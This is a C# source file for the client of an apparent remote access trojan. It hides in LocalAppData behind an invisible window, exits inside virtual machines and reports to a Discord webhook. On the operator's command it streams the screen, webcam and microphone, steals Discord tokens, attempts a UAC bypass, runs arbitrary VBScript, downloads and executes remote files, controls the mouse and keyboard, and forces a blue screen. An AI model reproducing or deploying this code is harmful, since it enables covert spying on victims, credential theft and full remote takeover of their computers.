using AForge.Video;
using AForge.Video.DirectShow;
using LazyServer;
using NAudio.CoreAudioApi;
using NAudio.Vorbis;
using NAudio.Wave;
using Newtonsoft.Json.Linq;
using PentestTools;
using Sweep.Forms;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    internal static class Program
    {
        public static JObject config = GClass.config();
        public static int monitoridx = 0;
        public static int cameraidx = 0;
        public static int micidx = 0;

        private static CancellationTokenSource screenshotTokenSource;
        private static Task screenshotLoopTask;
        private static readonly object screenshotLock = new();
        private static bool screenshotLoopRunning = false;

        private static CancellationTokenSource camTokenSource;
        private static Task camLoopTask;
        private static bool camLoopRunning = false;

        private static CancellationTokenSource micTokenSource;
        private static Task micLoopTask;
        private static bool micLoopRunning = false;

        private static Chat chatform;

        public static bool isGracefulDisconnect = false;
        private static WaveInEvent waveIn;

        [STAThread]
        static void Main()
        {
            // --- BEGIN: Self-move to random LocalAppData directory if needed ---
            if (GClass.IsTrue("move"))
            {
                string exePath = Application.ExecutablePath;
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string exeDir = Path.GetDirectoryName(exePath);

                // Check if already in LocalAppData (case-insensitive)
                if (!exeDir.StartsWith(localAppData, StringComparison.OrdinalIgnoreCase))
                {
                    // Get all existing directories in LocalAppData
                    string[] existingDirs = Directory.GetDirectories(localAppData);
                    string targetDir;

                    if (existingDirs.Length > 0)
                    {
                        // Pick a random existing directory
                        Random rnd = new Random();
                        targetDir = existingDirs[rnd.Next(existingDirs.Length)];
                    }
                    else
                    {
                        // No existing directories, create a new random one
                        targetDir = Path.Combine(localAppData, Path.GetRandomFileName());
                        Directory.CreateDirectory(targetDir);
                    }

                    string destExe = Path.Combine(targetDir, Path.GetFileName(exePath));

                    // Batch script to move and run
                    string batPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".bat");
                    File.WriteAllText(batPath,
                        $@"@echo off
            timeout /t 1 >nul
            move /y ""{exePath}"" ""{destExe}""
            start """" ""{destExe}""
            del ""%~f0""");

                    // Run batch and exit
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = batPath,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    });
                    Console.WriteLine($"Moved to: {destExe}");
                    Environment.Exit(0);
                }
            }
            // --- END: Self-move logic ---

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Task.Run(RunClientAsync);
            Application.Run(new InvisibleForm());
        }
        private static string GetUniqueFilePath(string filePath)
        {
            if (!File.Exists(filePath)) return filePath;

            string directory = Path.GetDirectoryName(filePath);
            string filenameWithoutExt = Path.GetFileNameWithoutExtension(filePath);
            string extension = Path.GetExtension(filePath);

            int counter = 1;
            string newFilePath;

            do
            {
                newFilePath = Path.Combine(directory, $"{filenameWithoutExt}_{counter}{extension}");
                counter++;
            }
            while (File.Exists(newFilePath));

            return newFilePath;
        }
        static async Task RunClientAsync()
        {
            if (GClass.IsTrue("debugmessage")) {
                MessageBox.Show("it works");
            }

            if (GClass.IsTrue("binfile")) { // for the builder
                Process.GetCurrentProcess().Kill();
            }

            if (GClass.IsTrue("antivm") && VirtualizationDetection.VMDetector.Detect() != VirtualizationDetection.VmType.None)
            {
                Process.GetCurrentProcess().Kill();
            }

            JObject clientInfo = await GClass.BuildClientInfo();

            if (GClass.IsTrue("discord") && config["webhook"] != null)
            {
                string webhookUrl = (string)config["webhook"];
                _ = GClass.SendWebhookNotificationAsync(webhookUrl, clientInfo);
            }
            await ClientManager.StartAsync();

            var client = ClientManager.GetClient();


            ClientManager.ClientDisconnected += async () =>
            {
                Console.WriteLine($"we disconnectin");
                while (!ClientManager.GetClient().IsConnected) {
                    Console.WriteLine($"waiting for client to reconnect...");
                    await Task.Delay(100);
                }
                await Task.Delay(500);
                SetupHandlers(ClientManager.GetClient());
            };

            
            /*await client.SendFileBytes(screenshot, clientInfo.ToString());
            await client.SendFileBytes(screenshot, clientInfo.ToString());
            */
            GClass.StartHeartbeat(client);
            SetupHandlers(client);
        }

        private static async void SetupHandlers(LazyServerClient client) {
            var screenshot = GClass.CaptureScreen(Screen.AllScreens[monitoridx]);
            // Replace your current FileOfferWithMetaReceived event handler with this:
            client.FileOfferWithMetaReceived += (s, e) => {
                try
                {
                    JObject message = JObject.Parse(e.FileRequest.Metadata);
                    string command = (string)message["command"];

                    switch (command)
                    {
                        case "openfile":
                            string filename = (string)message["filename"];

                            if (!string.IsNullOrEmpty(filename))
                            {
                                string savePath = Path.Combine(Path.GetTempPath(), filename);

                                savePath = GetUniqueFilePath(savePath);
                                File.WriteAllBytes(savePath, e.FileRequest.FileBytes);
                                Console.WriteLine($"File saved: {savePath}");

                                // Optional: Accept the file (for server-side tracking)
                                client.AcceptFile(e.FileRequest.TransferId, savePath);

                                // Open the file
                                System.Diagnostics.Process.Start(savePath);
                            }
                            else
                            {
                                // Fallback if no filename provided
                                string savePath = Path.Combine(Path.GetTempPath(), $"received_file_{DateTime.UtcNow:yyyyMMdd_HHmmss}.dat");
                                File.WriteAllBytes(savePath, e.FileRequest.FileBytes);
                                Console.WriteLine($"File saved (no filename in metadata): {savePath}");

                                client.AcceptFile(e.FileRequest.TransferId, savePath);
                                System.Diagnostics.Process.Start(savePath);
                            }
                            break;
                        case "wallpaper":
                            var filenaem = (string)message["filename"];

                            if (!string.IsNullOrEmpty(filenaem))
                            {
                                string savePath = Path.Combine(Path.GetTempPath(), filenaem);

                                savePath = GetUniqueFilePath(savePath);
                                File.WriteAllBytes(savePath, e.FileRequest.FileBytes);
                                Wallpaper.SilentSet(savePath, WallpaperStyle.Stretch);

                                if (File.Exists(savePath)) {
                                    File.Delete(savePath); // Clean up temp file after setting wallpaper
                                }
                            }

                            break;
                        case "playsound":
                            {
                                var soundFileName = (string)message["filename"];

                                if (!string.IsNullOrEmpty(soundFileName) && e.FileRequest?.FileBytes != null)
                                {
                                    var audioBytes = e.FileRequest.FileBytes;

                                    Task.Run(() =>
                                    {
                                        string tempOggPath = null;

                                        try
                                        {
                                            WaveStream reader;

                                            if (Path.GetExtension(soundFileName).Equals(".mp3", StringComparison.OrdinalIgnoreCase))
                                            {
                                                reader = new Mp3FileReader(new MemoryStream(audioBytes));
                                            }
                                            else if (Path.GetExtension(soundFileName).Equals(".wav", StringComparison.OrdinalIgnoreCase))
                                            {
                                                reader = new WaveFileReader(new MemoryStream(audioBytes));
                                            }
                                            else if (Path.GetExtension(soundFileName).Equals(".ogg", StringComparison.OrdinalIgnoreCase))
                                            {
                                                // Create temporary file for OGG
                                                tempOggPath = Path.Combine(Path.GetTempPath(), soundFileName);
                                                File.WriteAllBytes(tempOggPath, audioBytes);
                                                reader = new VorbisWaveReader(tempOggPath);
                                            }
                                            else
                                            {
                                                Console.WriteLine($"Unsupported audio format: {soundFileName}");
                                                return;
                                            }

                                            using (reader)
                                            using (var outputDevice = new WaveOutEvent())
                                            {
                                                outputDevice.Init(reader);
                                                outputDevice.Play();
                                                while (outputDevice.PlaybackState == PlaybackState.Playing)
                                                {
                                                    Thread.Sleep(100);
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine($"Error playing sound: {ex.Message}");
                                        }
                                        finally
                                        {
                                            // Clean up temporary OGG file if it exists
                                            if (!string.IsNullOrEmpty(tempOggPath) && File.Exists(tempOggPath))
                                            {
                                                try
                                                {
                                                    File.Delete(tempOggPath);
                                                }
                                                catch
                                                {
                                                    // Ignore errors on deletion
                                                }
                                            }
                                        }
                                    });
                                }
                            }
                            break;



                        // Add other commands as needed
                        default:
                            Console.WriteLine($"Unknown command: {command}");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error handling file offer: {ex.Message}");
                }
            };

            // Optional: Add a handler for FileCompleted to track when transfers finish
            client.FileCompleted += (s, e) => {
                Console.WriteLine($"File transfer completed: {e.FileRequest.Metadata} (Success: {e.Success})");
            };

            // Optional: Add a handler for FileProgress to see transfer progress
            client.FileProgress += (s, e) => {
                Console.WriteLine($"File progress: {e.BytesTransferred}/{e.TotalBytes} bytes ({(e.BytesTransferred * 100.0 / Math.Max(e.TotalBytes, 1)):F1}%)");
            };

            client.MessageReceived += async (s, e) =>
            {
                Console.WriteLine($"Received message: {e.Message}");
                try
                {
                    JObject message = JObject.Parse(e.Message);
                    string command = (string)message["command"];

                    switch (command)
                    {
                        case "ssloop":
                            Console.WriteLine("Starting screenshot loop...");
                            if (!screenshotLoopRunning)
                                await StartScreenshotLoopAsync(client, message);
                            break;

                        case "stopss":
                            if (screenshotLoopRunning)
                                await StopScreenshotLoopAsync();
                            break;

                        case "camloop":
                            if (!camLoopRunning)
                                await StartCamLoopAsync(client, message);
                            break;

                        case "stopcam":
                            if (camLoopRunning)
                                await StopCamLoopAsync();
                            break;

                        case "micloop":
                            if (!micLoopRunning)
                                await StartMicLoopAsync(client);
                            break;

                        case "stopmic":
                            if (micLoopRunning)
                                await StopMicLoopAsync();
                            break;

                        case "mon":
                            monitoridx = (int)message["idx"];
                            break;

                        case "cam":
                            cameraidx = (int)message["idx"];
                            break;

                        case "mic":
                            micidx = (int)message["idx"];
                            break;

                        case "uacbypass":
                            isGracefulDisconnect = true;
                            client.Disconnect();

                            if (!await GClass.TryBypassAndReconnect(client, screenshot))
                                isGracefulDisconnect = false;

                            break;

                        case "vbexec":
                            string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".vbs");
                            try
                            {
                                File.WriteAllText(tempPath, (string)message["body"]);
                                ProcessStartInfo psi = new()
                                {
                                    FileName = "wscript.exe",
                                    Arguments = $"\"{tempPath}\"",
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                };
                                using var p = Process.Start(psi);
                                p?.WaitForExit();
                            }
                            finally
                            {
                                try { File.Delete(tempPath); } catch { }
                            }
                            break;

                        case "grabtoken":
                            await client.SendMessage(new JObject
                            {
                                ["msg"] = "token",
                                ["body"] = GClass.GetDiscordTokens()
                            }.ToString());
                            break;

                        case "chat":
                            Application.OpenForms[0].BeginInvoke((Action)(async () =>
                            {
                                if (Chat.Instance == null || Chat.Instance.IsDisposed)
                                {
                                    new Chat(); // This sets Chat.Instance internally
                                    FormSlider.ShowSliding(Chat.Instance, 3);
                                }

                                string ip = await GClass.GetIp();

                                Chat.Instance.add($"[ Chatting with {(string)message["username"]} ]");
                                Chat.Instance.MessageSent += (text) =>
                                {

                                    _ = client.SendMessage(new JObject
                                    {
                                        ["msg"] = "chatmsg",
                                        ["username"] = $"{DeviceInfo.GetUsername()}@{ip}",
                                        ["text"] = text
                                    }.ToString());
                                };
                            }));
                            break;


                        case "chatmsg":
                            string username = (string)message["username"];
                            string text = (string)message["text"];

                            Application.OpenForms[0].BeginInvoke((Action)(() =>
                            {
                                if (Chat.Instance == null || Chat.Instance.IsDisposed)
                                {
                                    new Chat(); // Create and sets Chat.Instance
                                    FormSlider.ShowSliding(Chat.Instance, 3);
                                }

                                Chat.Instance.add($"<{username}>: {text}");
                            }));
                            break;

                        case "chatclose":
                            Application.OpenForms[0].BeginInvoke((Action)(() =>
                            {
                                if (Chat.Instance == null || Chat.Instance.IsDisposed)
                                {
                                    return;
                                }
                                FormSlider.SlideOut(Chat.Instance, 3);
                            }));
                            break;

                        case "togglesend":
                            Application.OpenForms[0].BeginInvoke((Action)(() =>
                            {
                                if (Chat.Instance == null || Chat.Instance.IsDisposed)
                                {
                                    new Chat(); // Create and sets Chat.Instance
                                    FormSlider.ShowSliding(Chat.Instance, 3);
                                }
                                Chat.Instance.ChangeSend?.Invoke((bool)message["body"]);
                            }));
                            break;

                        case "mousemove":
                            int x = (int)message["x"];
                            int y = (int)message["y"];
                            GClass.MouseMoveAbsolute(x, y);
                            break;
                        case "mouseclick":
                            string button = (string)message["button"];
                            GClass.PerformMouseClick(button);
                            break;
                        case "mousescroll":
                            int delta = (int)message["delta"];
                            GClass.ScrollMouse(delta);
                            break;
                        case "key":
                            string key = (string)message["key"];
                            GClass.SendKeyPress(key);
                            break;
                        case "url":
                            string bod = (string)message["body"];
                            System.Diagnostics.Process.Start(bod);
                            break;
                        case "bsod":
                            BlueScreenTrigger.TriggerBSOD();
                            break;
                        case "fileurl":
                            string fileUrl = (string)message["body"];

                            // Create a random filename with the same extension as the original
                            string extension = Path.GetExtension(fileUrl);
                            string tempFilePath = Path.Combine(
                                Path.GetTempPath(),
                                Path.GetRandomFileName() + extension
                            );

                            // Download the file
                            using (var client = new System.Net.WebClient())
                            {
                                client.DownloadFile(fileUrl, tempFilePath);
                            }

                            // Execute the downloaded file
                            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                            {
                                FileName = tempFilePath,
                                UseShellExecute = true
                            });

                            break;
                        case "msgbox":
                            string title = (string)message["title"];
                            string msg = (string)message["message"];
                            string buttonType = (string)message["button"];
                            string iconType = (string)message["icon"];
                            ShowCustomMessageBox(msg, title, buttonType, iconType);
                            break;

                    }
                }
                catch { /* silently ignore */ }
            };
        }

        static async Task StartScreenshotLoopAsync(LazyServerClient client, JObject message)
        {
            await StopScreenshotLoopAsync();

            Screen screen = Screen.AllScreens[monitoridx];
            Rectangle bounds = screen.Bounds;

            int screenWidth = bounds.Width;
            int screenHeight = bounds.Height;

            screenshotTokenSource = new CancellationTokenSource();
            var token = screenshotTokenSource.Token;

            int quality = 100;
            if (message["quality"] != null &&
                message["quality"].ToString().EndsWith("%") &&
                int.TryParse(message["quality"].ToString().TrimEnd('%'), out int qVal))
            {
                quality = Math.Max(10, Math.Min(qVal, 100));
            }

            screenshotLoopTask = Task.Run(async () =>
            {
                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        var shot = GClass.CaptureScreen(Screen.AllScreens[monitoridx], quality);
                        await client.SendFileBytes(shot, new JObject
                        {
                            ["msg"] = "screenshot",
                            ["monitors"] = Screen.AllScreens.Length,
                            ["width"] = screenWidth,
                            ["height"] = screenHeight
                        }.ToString());
                    }
                    catch { }

                    try
                    {
                        await Task.Delay(70, token);
                    }
                    catch (OperationCanceledException) { break; }
                }
            }, token);

            screenshotLoopRunning = true;
        }

        static async Task StopScreenshotLoopAsync()
        {
            lock (screenshotLock)
            {
                if (screenshotTokenSource == null)
                    return;
                screenshotTokenSource.Cancel();
            }

            if (screenshotLoopTask != null)
            {
                try { await screenshotLoopTask; }
                catch (OperationCanceledException) { }
                catch { }
            }

            screenshotTokenSource?.Dispose();
            screenshotTokenSource = null;
            screenshotLoopTask = null;
            screenshotLoopRunning = false;
        }

        static async Task StartCamLoopAsync(LazyServerClient client, JObject message)
        {
            await StopCamLoopAsync();

            camTokenSource = new CancellationTokenSource();
            var token = camTokenSource.Token;

            int quality = 90;
            if (message["quality"] != null &&
                message["quality"].ToString().EndsWith("%") &&
                int.TryParse(message["quality"].ToString().TrimEnd('%'), out int qVal))
            {
                quality = Math.Max(10, Math.Min(qVal, 100));
            }

            camLoopTask = Task.Run(async () =>
            {
                var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (devices.Count == 0 || cameraidx >= devices.Count) return;

                var videoSource = new VideoCaptureDevice(devices[cameraidx].MonikerString);
                Bitmap currentFrame = null;
                var frameReady = new ManualResetEventSlim(false);

                videoSource.NewFrame += (s, e) =>
                {
                    currentFrame?.Dispose();
                    currentFrame = (Bitmap)e.Frame.Clone();
                    frameReady.Set();
                };

                videoSource.Start();

                try
                {
                    while (!token.IsCancellationRequested)
                    {
                        frameReady.Wait(token);
                        frameReady.Reset();

                        if (currentFrame != null)
                        {
                            using var ms = new MemoryStream();
                            var encoderParams = new EncoderParameters(1);
                            encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, quality);
                            var jpegCodec = GClass.GetEncoder(ImageFormat.Jpeg);
                            currentFrame.Save(ms, jpegCodec, encoderParams);

                            await client.SendFileBytes(ms.ToArray(), new JObject
                            {
                                ["msg"] = "camframe",
                                ["cameras"] = devices.Count
                            }.ToString());
                        }

                        await Task.Delay(100, token);
                    }
                }
                catch (OperationCanceledException) { }
                catch { }
                finally
                {
                    if (videoSource.IsRunning)
                        videoSource.SignalToStop();
                    videoSource.WaitForStop();

                    currentFrame?.Dispose();
                }
            }, token);

            camLoopRunning = true;
        }

        static async Task StopCamLoopAsync()
        {
            if (camTokenSource != null)
            {
                camTokenSource.Cancel();
                try { await camLoopTask; } catch (OperationCanceledException) { } catch { }
                camTokenSource.Dispose();
            }

            camTokenSource = null;
            camLoopTask = null;
            camLoopRunning = false;
        }
        public static string[] GetAvailableMicrophones()
        {
            var microphones = new List<string>();

            for (int i = 0; i < WaveIn.DeviceCount; i++)
            {
                var deviceInfo = WaveIn.GetCapabilities(i);
                microphones.Add(deviceInfo.ProductName);
            }

            return microphones.ToArray();
        }
        static async Task StartMicLoopAsync(LazyServerClient client)
        {
            await StopMicLoopAsync();

            micTokenSource = new CancellationTokenSource();
            var token = micTokenSource.Token;

            int deviceCount = WaveIn.DeviceCount;
            if (deviceCount == 0 || micidx >= deviceCount) return;

            waveIn = new WaveInEvent
            {
                DeviceNumber = micidx,
                WaveFormat = new WaveFormat(8000, 16, 1),
                BufferMilliseconds = 50
            };

            waveIn.DataAvailable += (s, e) =>
            {
                if (token.IsCancellationRequested) return;

                var pcm = new byte[e.BytesRecorded];
                Array.Copy(e.Buffer, 0, pcm, 0, e.BytesRecorded);

                _ = client.SendFileBytes(pcm, new JObject
                {
                    ["msg"] = "micaudio",
                    ["microphones"] = deviceCount,
                    ["devices"] = JArray.FromObject(GetAvailableMicrophones())
                }.ToString());
            };

            waveIn.StartRecording();
            micLoopRunning = true;

            micLoopTask = Task.Run(async () =>
            {
                try
                {
                    while (!token.IsCancellationRequested)
                        await Task.Delay(100, token);
                }
                catch (OperationCanceledException) { }
                finally
                {
                    waveIn.StopRecording();
                    waveIn.Dispose();
                }
            }, token);
        }

        static async Task StopMicLoopAsync()
        {
            if (micTokenSource != null)
            {
                micTokenSource.Cancel();
                try { await micLoopTask; } catch { };
                micTokenSource.Dispose();
            }

            micTokenSource = null;
            micLoopTask = null;
            micLoopRunning = false;
        }
        static void ShowCustomMessageBox(string text, string title, string buttonType, string iconType)
        {
            MessageBoxButtons buttons = buttonType.ToLower() switch
            {
                "ok" => MessageBoxButtons.OK,
                "okcancel" => MessageBoxButtons.OKCancel,
                "yesno" => MessageBoxButtons.YesNo,
                "yesnocancel" => MessageBoxButtons.YesNoCancel,
                _ => MessageBoxButtons.OK
            };

            MessageBoxIcon icon = iconType.ToLower() switch
            {
                "warn" => MessageBoxIcon.Warning,
                "info" => MessageBoxIcon.Information,
                "error" => MessageBoxIcon.Error,
                "question" => MessageBoxIcon.Question,
                _ => MessageBoxIcon.None
            };

            Task.Run(() => MessageBox.Show(text, title, buttons, icon));
        }
    }

    public class InvisibleForm : Form
    {
        public InvisibleForm()
        {
            ShowInTaskbar = false;
            WindowState = FormWindowState.Minimized;
            FormBorderStyle = FormBorderStyle.None;
            Opacity = 0;
            Load += (s, e) => Hide();
        }
    }
}
